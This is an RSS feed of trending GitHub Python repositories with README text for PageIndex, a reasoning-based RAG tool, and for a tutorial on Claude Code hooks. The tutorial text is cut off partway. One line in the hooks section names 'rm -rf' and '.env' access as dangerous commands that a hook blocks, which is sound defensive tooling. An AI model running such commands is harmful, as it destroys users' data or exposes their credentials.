<rss version="2.0">
  <channel>
    <title>GitHub Python Weekly Trending</title>
    <description>Weekly Trending of Python in GitHub</description>
    <pubDate>Fri, 06 Feb 2026 01:53:54 GMT</pubDate>
    <link>http://mshibanami.github.io/GitHubTrendingRSS</link>
    
    <item>
      <title>VectifyAI/PageIndex</title>
      <link>https://github.com/VectifyAI/PageIndex</link>
      <description>&lt;p&gt;üìë PageIndex: Document Index for Vectorless, Reasoning-based RAG&lt;/p&gt;&lt;hr&gt;&lt;div align="center"&gt; 
 &lt;a href="https://vectify.ai/pageindex" target="_blank"&gt; &lt;img src="https://github.com/user-attachments/assets/46201e72-675b-43bc-bfbd-081cc6b65a1d" alt="PageIndex Banner" /&gt; &lt;/a&gt; 
 &lt;br /&gt; 
 &lt;br /&gt; 
 &lt;p align="center"&gt; &lt;a href="https://trendshift.io/repositories/14736" target="_blank"&gt;&lt;img src="https://trendshift.io/api/badge/repositories/14736" alt="VectifyAI%2FPageIndex | Trendshift" style="width: 250px; height: 55px;" width="250" height="55" /&gt;&lt;/a&gt; &lt;/p&gt; 
 &lt;h1&gt;PageIndex: Vectorless, Reasoning-based RAG&lt;/h1&gt; 
 &lt;p align="center"&gt;&lt;b&gt;Reasoning-based RAG&amp;nbsp; ‚ó¶ &amp;nbsp;No Vector DB&amp;nbsp; ‚ó¶ &amp;nbsp;No Chunking&amp;nbsp; ‚ó¶ &amp;nbsp;Human-like Retrieval&lt;/b&gt;&lt;/p&gt; 
 &lt;h4 align="center"&gt; &lt;a href="https://vectify.ai"&gt;üè† Homepage&lt;/a&gt;&amp;nbsp; ‚Ä¢ &amp;nbsp; &lt;a href="https://chat.pageindex.ai"&gt;üñ•Ô∏è Chat Platform&lt;/a&gt;&amp;nbsp; ‚Ä¢ &amp;nbsp; &lt;a href="https://pageindex.ai/mcp"&gt;üîå MCP&lt;/a&gt;&amp;nbsp; ‚Ä¢ &amp;nbsp; &lt;a href="https://docs.pageindex.ai"&gt;üìö Docs&lt;/a&gt;&amp;nbsp; ‚Ä¢ &amp;nbsp; &lt;a href="https://discord.com/invite/VuXuf29EUj"&gt;üí¨ Discord&lt;/a&gt;&amp;nbsp; ‚Ä¢ &amp;nbsp; &lt;a href="https://ii2abc2jejf.typeform.com/to/tK3AXl8T"&gt;‚úâÔ∏è Contact&lt;/a&gt;&amp;nbsp; &lt;/h4&gt; 
&lt;/div&gt; 
&lt;details open&gt; 
 &lt;summary&gt;&lt;h3&gt;üì¢ Latest Updates&lt;/h3&gt;&lt;/summary&gt; 
 &lt;p&gt;&lt;strong&gt;üî• Releases:&lt;/strong&gt;&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;a href="https://chat.pageindex.ai"&gt;&lt;strong&gt;PageIndex Chat&lt;/strong&gt;&lt;/a&gt;: The first human-like document-analysis agent &lt;a href="https://chat.pageindex.ai"&gt;platform&lt;/a&gt; built for professional long documents. Can also be integrated via &lt;a href="https://pageindex.ai/mcp"&gt;MCP&lt;/a&gt; or &lt;a href="https://docs.pageindex.ai/quickstart"&gt;API&lt;/a&gt; (beta).&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;!-- - [**PageIndex Chat API**](https://docs.pageindex.ai/quickstart): An API that brings PageIndex's advanced long-document intelligence directly into your applications and workflows. --&gt; 
 &lt;!-- - [PageIndex MCP](https://pageindex.ai/mcp): Bring PageIndex into Claude, Cursor, or any MCP-enabled agent. Chat with long PDFs in a reasoning-based, human-like way. --&gt; 
 &lt;p&gt;&lt;strong&gt;üìù Articles:&lt;/strong&gt;&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;a href="https://pageindex.ai/blog/pageindex-intro"&gt;&lt;strong&gt;PageIndex Framework&lt;/strong&gt;&lt;/a&gt;: Introduces the PageIndex framework ‚Äî an &lt;em&gt;agentic, in-context&lt;/em&gt; &lt;em&gt;tree index&lt;/em&gt; that enables LLMs to perform &lt;em&gt;reasoning-based&lt;/em&gt;, &lt;em&gt;human-like retrieval&lt;/em&gt; over long documents, without vector DB or chunking.&lt;/li&gt; 
 &lt;/ul&gt; 
 &lt;!-- - [Do We Still Need OCR?](https://pageindex.ai/blog/do-we-need-ocr): Explores how vision-based, reasoning-native RAG challenges the traditional OCR pipeline, and why the future of document AI might be *vectorless* and *vision-based*. --&gt; 
 &lt;p&gt;&lt;strong&gt;üß™ Cookbooks:&lt;/strong&gt;&lt;/p&gt; 
 &lt;ul&gt; 
  &lt;li&gt;&lt;a href="https://docs.pageindex.ai/cookbook/vectorless-rag-pageindex"&gt;Vectorless RAG&lt;/a&gt;: A minimal, hands-on example of reasoning-based RAG using PageIndex. No vectors, no chunking, and human-like retrieval.&lt;/li&gt; 
  &lt;li&gt;&lt;a href="https://docs.pageindex.ai/cookbook/vision-rag-pageindex"&gt;Vision-based Vectorless RAG&lt;/a&gt;: OCR-free, vision-only RAG with PageIndex's reasoning-native retrieval workflow that works directly over PDF page images.&lt;/li&gt; 
 &lt;/ul&gt; 
&lt;/details&gt; 
&lt;hr /&gt; 
&lt;h1&gt;üìë Introduction to PageIndex&lt;/h1&gt; 
&lt;p&gt;Are you frustrated with vector database retrieval accuracy for long professional documents? Traditional vector-based RAG relies on semantic &lt;em&gt;similarity&lt;/em&gt; rather than true &lt;em&gt;relevance&lt;/em&gt;. But &lt;strong&gt;similarity ‚â† relevance&lt;/strong&gt; ‚Äî what we truly need in retrieval is &lt;strong&gt;relevance&lt;/strong&gt;, and that requires &lt;strong&gt;reasoning&lt;/strong&gt;. When working with professional documents that demand domain expertise and multi-step reasoning, similarity search often falls short.&lt;/p&gt; 
&lt;p&gt;Inspired by AlphaGo, we propose &lt;strong&gt;&lt;a href="https://vectify.ai/pageindex"&gt;PageIndex&lt;/a&gt;&lt;/strong&gt; ‚Äî a &lt;strong&gt;vectorless&lt;/strong&gt;, &lt;strong&gt;reasoning-based RAG&lt;/strong&gt; system that builds a &lt;strong&gt;hierarchical tree index&lt;/strong&gt; from long documents and uses LLMs to &lt;strong&gt;reason&lt;/strong&gt; &lt;em&gt;over that index&lt;/em&gt; for &lt;strong&gt;agentic, context-aware retrieval&lt;/strong&gt;. It simulates how &lt;em&gt;human experts&lt;/em&gt; navigate and extract knowledge from complex documents through &lt;em&gt;tree search&lt;/em&gt;, enabling LLMs to &lt;em&gt;think&lt;/em&gt; and &lt;em&gt;reason&lt;/em&gt; their way to the most relevant document sections. PageIndex performs retrieval in two steps:&lt;/p&gt; 
&lt;ol&gt; 
 &lt;li&gt;Generate a ‚ÄúTable-of-Contents‚Äù &lt;strong&gt;tree structure index&lt;/strong&gt; of documents&lt;/li&gt; 
 &lt;li&gt;Perform reasoning-based retrieval through &lt;strong&gt;tree search&lt;/strong&gt;&lt;/li&gt; 
&lt;/ol&gt; 
&lt;div align="center"&gt; 
 &lt;a href="https://pageindex.ai/blog/pageindex-intro" target="_blank" title="The PageIndex Framework"&gt; &lt;img src="https://docs.pageindex.ai/images/cookbook/vectorless-rag.png" width="70%" /&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;h3&gt;üéØ Core Features&lt;/h3&gt; 
&lt;p&gt;Compared to traditional vector-based RAG, &lt;strong&gt;PageIndex&lt;/strong&gt; features:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;No Vector DB&lt;/strong&gt;: Uses document structure and LLM reasoning for retrieval, instead of vector similarity search.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;No Chunking&lt;/strong&gt;: Documents are organized into natural sections, not artificial chunks.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Human-like Retrieval&lt;/strong&gt;: Simulates how human experts navigate and extract knowledge from complex documents.&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;Better Explainability and Traceability&lt;/strong&gt;: Retrieval is based on reasoning ‚Äî traceable and interpretable, with page and section references. No more opaque, approximate vector search (‚Äúvibe retrieval‚Äù).&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;PageIndex powers a reasoning-based RAG system that achieved &lt;strong&gt;state-of-the-art&lt;/strong&gt; &lt;a href="https://github.com/VectifyAI/Mafin2.5-FinanceBench"&gt;98.7% accuracy&lt;/a&gt; on FinanceBench, demonstrating superior performance over vector-based RAG solutions in professional document analysis (see our &lt;a href="https://vectify.ai/blog/Mafin2.5"&gt;blog post&lt;/a&gt; for details).&lt;/p&gt; 
&lt;h3&gt;üìç Explore PageIndex&lt;/h3&gt; 
&lt;p&gt;To learn more, please see a detailed introduction of the &lt;a href="https://pageindex.ai/blog/pageindex-intro"&gt;PageIndex framework&lt;/a&gt;. Check out this GitHub repo for open-source code, and the &lt;a href="https://docs.pageindex.ai/cookbook"&gt;cookbooks&lt;/a&gt;, &lt;a href="https://docs.pageindex.ai/tutorials"&gt;tutorials&lt;/a&gt;, and &lt;a href="https://pageindex.ai/blog"&gt;blog&lt;/a&gt; for additional usage guides and examples.&lt;/p&gt; 
&lt;p&gt;The PageIndex service is available as a ChatGPT-style &lt;a href="https://chat.pageindex.ai"&gt;chat platform&lt;/a&gt;, or can be integrated via &lt;a href="https://pageindex.ai/mcp"&gt;MCP&lt;/a&gt; or &lt;a href="https://docs.pageindex.ai/quickstart"&gt;API&lt;/a&gt;.&lt;/p&gt; 
&lt;h3&gt;üõ†Ô∏è Deployment Options&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Self-host ‚Äî run locally with this open-source repo.&lt;/li&gt; 
 &lt;li&gt;Cloud Service ‚Äî try instantly with our &lt;a href="https://chat.pageindex.ai/"&gt;Chat Platform&lt;/a&gt;, or integrate with &lt;a href="https://pageindex.ai/mcp"&gt;MCP&lt;/a&gt; or &lt;a href="https://docs.pageindex.ai/quickstart"&gt;API&lt;/a&gt;.&lt;/li&gt; 
 &lt;li&gt;&lt;em&gt;Enterprise&lt;/em&gt; ‚Äî private or on-prem deployment. &lt;a href="https://ii2abc2jejf.typeform.com/to/tK3AXl8T"&gt;Contact us&lt;/a&gt; or &lt;a href="https://calendly.com/pageindex/meet"&gt;book a demo&lt;/a&gt; for more details.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;üß™ Quick Hands-on&lt;/h3&gt; 
&lt;ul&gt; 
 &lt;li&gt;Try the &lt;a href="https://github.com/VectifyAI/PageIndex/raw/main/cookbook/pageindex_RAG_simple.ipynb"&gt;&lt;strong&gt;Vectorless RAG&lt;/strong&gt;&lt;/a&gt; notebook ‚Äî a &lt;em&gt;minimal&lt;/em&gt;, hands-on example of reasoning-based RAG using PageIndex.&lt;/li&gt; 
 &lt;li&gt;Experiment with &lt;a href="https://github.com/VectifyAI/PageIndex/raw/main/cookbook/vision_RAG_pageindex.ipynb"&gt;&lt;em&gt;Vision-based Vectorless RAG&lt;/em&gt;&lt;/a&gt; ‚Äî no OCR; a minimal, reasoning-native RAG pipeline that works directly over page images.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;div align="center"&gt; 
 &lt;a href="https://colab.research.google.com/github/VectifyAI/PageIndex/blob/main/cookbook/pageindex_RAG_simple.ipynb" target="_blank" rel="noopener"&gt; &lt;img src="https://img.shields.io/badge/Open_In_Colab-Vectorless_RAG-orange?style=for-the-badge&amp;amp;logo=googlecolab" alt="Open in Colab: Vectorless RAG" /&gt; &lt;/a&gt; &amp;nbsp;&amp;nbsp; 
 &lt;a href="https://colab.research.google.com/github/VectifyAI/PageIndex/blob/main/cookbook/vision_RAG_pageindex.ipynb" target="_blank" rel="noopener"&gt; &lt;img src="https://img.shields.io/badge/Open_In_Colab-Vision_RAG-orange?style=for-the-badge&amp;amp;logo=googlecolab" alt="Open in Colab: Vision RAG" /&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;hr /&gt; 
&lt;h1&gt;üå≤ PageIndex Tree Structure&lt;/h1&gt; 
&lt;p&gt;PageIndex can transform lengthy PDF documents into a semantic &lt;strong&gt;tree structure&lt;/strong&gt;, similar to a &lt;em&gt;"table of contents"&lt;/em&gt; but optimized for use with Large Language Models (LLMs). It's ideal for: financial reports, regulatory filings, academic textbooks, legal or technical manuals, and any document that exceeds LLM context limits.&lt;/p&gt; 
&lt;p&gt;Below is an example PageIndex tree structure. Also see more example &lt;a href="https://github.com/VectifyAI/PageIndex/tree/main/tests/pdfs"&gt;documents&lt;/a&gt; and generated &lt;a href="https://github.com/VectifyAI/PageIndex/tree/main/tests/results"&gt;tree structures&lt;/a&gt;.&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-jsonc"&gt;...
{
  "title": "Financial Stability",
  "node_id": "0006",
  "start_index": 21,
  "end_index": 22,
  "summary": "The Federal Reserve ...",
  "nodes": [
    {
      "title": "Monitoring Financial Vulnerabilities",
      "node_id": "0007",
      "start_index": 22,
      "end_index": 28,
      "summary": "The Federal Reserve's monitoring ..."
    },
    {
      "title": "Domestic and International Cooperation and Coordination",
      "node_id": "0008",
      "start_index": 28,
      "end_index": 31,
      "summary": "In 2023, the Federal Reserve collaborated ..."
    }
  ]
}
...
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You can generate the PageIndex tree structure with this open-source repo, or use our &lt;a href="https://docs.pageindex.ai/quickstart"&gt;API&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;h1&gt;‚öôÔ∏è Package Usage&lt;/h1&gt; 
&lt;p&gt;You can follow these steps to generate a PageIndex tree from a PDF document.&lt;/p&gt; 
&lt;h3&gt;1. Install dependencies&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;pip3 install --upgrade -r requirements.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;2. Set your OpenAI API key&lt;/h3&gt; 
&lt;p&gt;Create a &lt;code&gt;.env&lt;/code&gt; file in the root directory and add your API key:&lt;/p&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;CHATGPT_API_KEY=your_openai_key_here
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;3. Run PageIndex on your PDF&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-bash"&gt;python3 run_pageindex.py --pdf_path /path/to/your/document.pdf
&lt;/code&gt;&lt;/pre&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;Optional parameters&lt;/strong&gt;&lt;/summary&gt; 
 &lt;br /&gt; You can customize the processing with additional optional arguments: 
 &lt;pre&gt;&lt;code&gt;--model                 OpenAI model to use (default: gpt-4o-2024-11-20)
--toc-check-pages       Pages to check for table of contents (default: 20)
--max-pages-per-node    Max pages per node (default: 10)
--max-tokens-per-node   Max tokens per node (default: 20000)
--if-add-node-id        Add node ID (yes/no, default: yes)
--if-add-node-summary   Add node summary (yes/no, default: yes)
--if-add-doc-description Add doc description (yes/no, default: yes)
&lt;/code&gt;&lt;/pre&gt; 
&lt;/details&gt; 
&lt;details&gt; 
 &lt;summary&gt;&lt;strong&gt;Markdown support&lt;/strong&gt;&lt;/summary&gt; 
 &lt;br /&gt; We also provide markdown support for PageIndex. You can use the `-md_path` flag to generate a tree structure for a markdown file. 
 &lt;pre&gt;&lt;code class="language-bash"&gt;python3 run_pageindex.py --md_path /path/to/your/document.md
&lt;/code&gt;&lt;/pre&gt; 
 &lt;blockquote&gt; 
  &lt;p&gt;Note: in this function, we use "#" to determine node heading and their levels. For example, "##" is level 2, "###" is level 3, etc. Make sure your markdown file is formatted correctly. If your Markdown file was converted from a PDF or HTML, we don't recommend using this function, since most existing conversion tools cannot preserve the original hierarchy. Instead, use our &lt;a href="https://pageindex.ai/blog/ocr"&gt;PageIndex OCR&lt;/a&gt;, which is designed to preserve the original hierarchy, to convert the PDF to a markdown file and then use this function.&lt;/p&gt; 
 &lt;/blockquote&gt; 
&lt;/details&gt; 
&lt;!-- 
# ‚òÅÔ∏è Improved Tree Generation with PageIndex OCR

This repo is designed for generating PageIndex tree structure for simple PDFs, but many real-world use cases involve complex PDFs that are hard to parse by classic Python tools. However, extracting high-quality text from PDF documents remains a non-trivial challenge. Most OCR tools only extract page-level content, losing the broader document context and hierarchy.

To address this, we introduced PageIndex OCR ‚Äî the first long-context OCR model designed to preserve the global structure of documents. PageIndex OCR significantly outperforms other leading OCR tools, such as those from Mistral and Contextual AI, in recognizing true hierarchy and semantic relationships across document pages.

- Experience next-level OCR quality with PageIndex OCR at our [Dashboard](https://dash.pageindex.ai/).
- Integrate PageIndex OCR seamlessly into your stack via our [API](https://docs.pageindex.ai/quickstart).

&lt;p align="center"&gt;
  &lt;img src="https://github.com/user-attachments/assets/eb35d8ae-865c-4e60-a33b-ebbd00c41732" width="80%"&gt;
&lt;/p&gt;
--&gt; 
&lt;hr /&gt; 
&lt;h1&gt;üìà Case Study: PageIndex Leads Finance QA Benchmark&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://vectify.ai/mafin"&gt;Mafin 2.5&lt;/a&gt; is a reasoning-based RAG system for financial document analysis, powered by &lt;strong&gt;PageIndex&lt;/strong&gt;. It achieved a state-of-the-art &lt;a href="https://vectify.ai/blog/Mafin2.5"&gt;&lt;strong&gt;98.7% accuracy&lt;/strong&gt;&lt;/a&gt; on the &lt;a href="https://arxiv.org/abs/2311.11944"&gt;FinanceBench&lt;/a&gt; benchmark, significantly outperforming traditional vector-based RAG systems.&lt;/p&gt; 
&lt;p&gt;PageIndex's hierarchical indexing and reasoning-driven retrieval enable precise navigation and extraction of relevant context from complex financial reports, such as SEC filings and earnings disclosures.&lt;/p&gt; 
&lt;p&gt;Explore the full &lt;a href="https://github.com/VectifyAI/Mafin2.5-FinanceBench"&gt;benchmark results&lt;/a&gt; and our &lt;a href="https://vectify.ai/blog/Mafin2.5"&gt;blog post&lt;/a&gt; for detailed comparisons and performance metrics.&lt;/p&gt; 
&lt;div align="center"&gt; 
 &lt;a href="https://github.com/VectifyAI/Mafin2.5-FinanceBench"&gt; &lt;img src="https://github.com/user-attachments/assets/571aa074-d803-43c7-80c4-a04254b782a3" width="70%" /&gt; &lt;/a&gt; 
&lt;/div&gt; 
&lt;hr /&gt; 
&lt;h1&gt;üß≠ Resources&lt;/h1&gt; 
&lt;ul&gt; 
 &lt;li&gt;üß™ &lt;a href="https://docs.pageindex.ai/cookbook/vectorless-rag-pageindex"&gt;Cookbooks&lt;/a&gt;: hands-on, runnable examples and advanced use cases.&lt;/li&gt; 
 &lt;li&gt;üìñ &lt;a href="https://docs.pageindex.ai/doc-search"&gt;Tutorials&lt;/a&gt;: practical guides and strategies, including &lt;em&gt;Document Search&lt;/em&gt; and &lt;em&gt;Tree Search&lt;/em&gt;.&lt;/li&gt; 
 &lt;li&gt;üìù &lt;a href="https://pageindex.ai/blog"&gt;Blog&lt;/a&gt;: technical articles, research insights, and product updates.&lt;/li&gt; 
 &lt;li&gt;üîå &lt;a href="https://pageindex.ai/mcp#quick-setup"&gt;MCP setup&lt;/a&gt; &amp;amp; &lt;a href="https://docs.pageindex.ai/quickstart"&gt;API docs&lt;/a&gt;: integration details and configuration options.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;hr /&gt; 
&lt;h1&gt;‚≠ê Support Us&lt;/h1&gt; 
&lt;p&gt;Leave us a star üåü if you like our project. Thank you!&lt;/p&gt; 
&lt;p&gt; &lt;img src="https://github.com/user-attachments/assets/eae4ff38-48ae-4a7c-b19f-eab81201d794" width="80%" /&gt; &lt;/p&gt; 
&lt;h3&gt;Connect with Us&lt;/h3&gt; 
&lt;p&gt;&lt;a href="https://x.com/PageIndexAI"&gt;&lt;img src="https://img.shields.io/badge/Twitter-000000?style=for-the-badge&amp;amp;logo=x&amp;amp;logoColor=white" alt="Twitter" /&gt;&lt;/a&gt;&amp;nbsp; &lt;a href="https://www.linkedin.com/company/vectify-ai/"&gt;&lt;img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&amp;amp;logo=linkedin&amp;amp;logoColor=white" alt="LinkedIn" /&gt;&lt;/a&gt;&amp;nbsp; &lt;a href="https://discord.com/invite/VuXuf29EUj"&gt;&lt;img src="https://img.shields.io/badge/Discord-5865F2?style=for-the-badge&amp;amp;logo=discord&amp;amp;logoColor=white" alt="Discord" /&gt;&lt;/a&gt;&amp;nbsp; &lt;a href="https://ii2abc2jejf.typeform.com/to/tK3AXl8T"&gt;&lt;img src="https://img.shields.io/badge/Contact_Us-3B82F6?style=for-the-badge&amp;amp;logo=envelope&amp;amp;logoColor=white" alt="Contact Us" /&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;hr /&gt; 
&lt;p&gt;¬© 2025 &lt;a href="https://vectify.ai"&gt;Vectify AI&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>disler/claude-code-hooks-mastery</title>
      <link>https://github.com/disler/claude-code-hooks-mastery</link>
      <description>&lt;p&gt;Master Claude Code Hooks&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Claude Code Hooks Mastery&lt;/h1&gt; 
&lt;p&gt;&lt;a href="https://docs.anthropic.com/en/docs/claude-code/hooks"&gt;Claude Code Hooks&lt;/a&gt; - Quickly master how to use Claude Code hooks to add deterministic (or non-deterministic) control over Claude Code's behavior. Plus learn about &lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#claude-code-sub-agents"&gt;Claude Code Sub-Agents&lt;/a&gt;, the powerful &lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#the-meta-agent"&gt;Meta-Agent&lt;/a&gt;, and &lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#team-based-validation-system"&gt;Team-Based Validation&lt;/a&gt; with agent orchestration.&lt;/p&gt; 
&lt;img src="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/images/hooked.png" alt="Claude Code Hooks" style="max-width: 800px; width: 100%;" /&gt; 
&lt;h2&gt;Table of Contents&lt;/h2&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#prerequisites"&gt;Prerequisites&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#hook-lifecycle--payloads"&gt;Hook Lifecycle &amp;amp; Payloads&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#what-this-shows"&gt;What This Shows&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#uv-single-file-scripts-architecture"&gt;UV Single-File Scripts Architecture&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#key-files"&gt;Key Files&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#features-demonstrated"&gt;Features Demonstrated&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#hook-error-codes--flow-control"&gt;Hook Error Codes &amp;amp; Flow Control&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#userpromptsubmit-hook-deep-dive"&gt;UserPromptSubmit Hook Deep Dive&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#claude-code-sub-agents"&gt;Claude Code Sub-Agents&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#team-based-validation-system"&gt;Team-Based Validation System&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#output-styles-collection"&gt;Output Styles Collection&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href="https://raw.githubusercontent.com/disler/claude-code-hooks-mastery/main/#custom-status-lines"&gt;Custom Status Lines&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Prerequisites&lt;/h2&gt; 
&lt;p&gt;This requires:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://docs.astral.sh/uv/getting-started/installation/"&gt;Astral UV&lt;/a&gt;&lt;/strong&gt; - Fast Python package installer and resolver&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://docs.anthropic.com/en/docs/claude-code"&gt;Claude Code&lt;/a&gt;&lt;/strong&gt; - Anthropic's CLI for Claude AI&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h3&gt;Optional Setup:&lt;/h3&gt; 
&lt;p&gt;Optional:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://elevenlabs.io/"&gt;ElevenLabs&lt;/a&gt;&lt;/strong&gt; - Text-to-speech provider (with MCP server integration)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://github.com/elevenlabs/elevenlabs-mcp"&gt;ElevenLabs MCP Server&lt;/a&gt;&lt;/strong&gt; - MCP server for ElevenLabs&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://www.firecrawl.dev/mcp"&gt;Firecrawl MCP Server&lt;/a&gt;&lt;/strong&gt; - Web scraping and crawling MCP server (my favorite scraper)&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://openai.com/"&gt;OpenAI&lt;/a&gt;&lt;/strong&gt; - Language model provider + Text-to-speech provider&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://www.anthropic.com/"&gt;Anthropic&lt;/a&gt;&lt;/strong&gt; - Language model provider&lt;/li&gt; 
 &lt;li&gt;&lt;strong&gt;&lt;a href="https://ollama.com/"&gt;Ollama&lt;/a&gt;&lt;/strong&gt; - Local language model provider&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;Hook Lifecycle &amp;amp; Payloads&lt;/h2&gt; 
&lt;p&gt;This demo captures all 13 Claude Code hook lifecycle events with their JSON payloads:&lt;/p&gt; 
&lt;h3&gt;Hook Lifecycle Overview&lt;/h3&gt; 
&lt;pre&gt;&lt;code class="language-mermaid"&gt;flowchart TB
    subgraph SESSION["üü¢ Session Lifecycle"]
        direction TB
        SETUP[["üîß Setup&amp;lt;br/&amp;gt;(init/maintenance)"]]
        START[["‚ñ∂Ô∏è SessionStart&amp;lt;br/&amp;gt;(startup/resume/clear)"]]
        END[["‚èπÔ∏è SessionEnd&amp;lt;br/&amp;gt;(exit/sigint/error)"]]
    end

    subgraph MAIN["üîÑ Main Conversation Loop"]
        direction TB
        PROMPT[["üìù UserPromptSubmit"]]
        CLAUDE["Claude Processes"]

        subgraph TOOLS["üõ†Ô∏è Tool Execution"]
            direction TB
            PRE[["üîí PreToolUse"]]
            PERM[["‚ùì PermissionRequest"]]
            EXEC["Tool Executes"]
            POST[["‚úÖ PostToolUse"]]
            FAIL[["‚ùå PostToolUseFailure"]]
        end

        subgraph SUBAGENT["ü§ñ Subagent Lifecycle"]
            direction TB
            SSTART[["üöÄ SubagentStart"]]
            SWORK["Subagent Works"]
            SSTOP[["üèÅ SubagentStop"]]
        end

        NOTIFY[["üîî Notification&amp;lt;br/&amp;gt;(Async)"]]
        STOP[["üõë Stop"]]
    end

    subgraph COMPACT["üóúÔ∏è Maintenance"]
        PRECOMPACT[["üì¶ PreCompact"]]
    end

    SETUP --&amp;gt; START
    START --&amp;gt; PROMPT
    PROMPT --&amp;gt; CLAUDE
    CLAUDE --&amp;gt; PRE
    PRE --&amp;gt; PERM
    PERM --&amp;gt; EXEC
    EXEC --&amp;gt; POST
    EXEC -.-&amp;gt; FAIL
    CLAUDE -.-&amp;gt; SSTART
    SSTART --&amp;gt; SWORK
    SWORK --&amp;gt; SSTOP
    POST --&amp;gt; CLAUDE
    CLAUDE --&amp;gt; STOP
    CLAUDE -.-&amp;gt; NOTIFY
    STOP --&amp;gt; PROMPT
    STOP -.-&amp;gt; END
    PROMPT -.-&amp;gt; PRECOMPACT
    PRECOMPACT -.-&amp;gt; PROMPT
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;1. UserPromptSubmit Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; Immediately when user submits a prompt (before Claude processes it)&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;prompt&lt;/code&gt; text, &lt;code&gt;session_id&lt;/code&gt;, timestamp&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Prompt validation, logging, context injection, security filtering&lt;/p&gt; 
&lt;h3&gt;2. PreToolUse Hook&lt;/h3&gt; 
&lt;p&gt;&lt;strong&gt;Fires:&lt;/strong&gt; Before any tool execution&lt;br /&gt; &lt;strong&gt;Payload:&lt;/strong&gt; &lt;code&gt;tool_name&lt;/code&gt;, &lt;code&gt;tool_input&lt;/code&gt; parameters&lt;br /&gt; &lt;strong&gt;Enhanced:&lt;/strong&gt; Blocks dangerous commands (&lt;code&gt;rm -rf&lt;/code&gt;, &lt;code&gt;.env&lt;/code&gt; access)&lt;/p&gt; 
&lt;h3&gt;3. PostToolUse Hook&lt;/h3&gt; 
